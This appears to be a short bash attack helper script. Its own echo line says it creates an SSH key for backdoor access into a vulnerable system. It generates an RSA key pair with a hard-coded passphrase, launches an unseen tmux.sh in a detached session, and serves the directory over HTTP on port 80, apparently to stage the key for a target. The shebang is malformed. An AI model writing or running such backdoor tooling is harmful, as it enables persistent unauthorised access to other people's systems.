#/bin/bash
echo This script will create an SSH key for backdoor access into a vulnerable system
ssh-keygen -t rsa -N "passphrase" -f RSA_KEY
tmux new -d -s GG
tmux send-keys -t GG.0 "./tmux.sh"
python3 -m http.server 80
#http://man7.org/linux/man-pages/man1/tmux.1.html
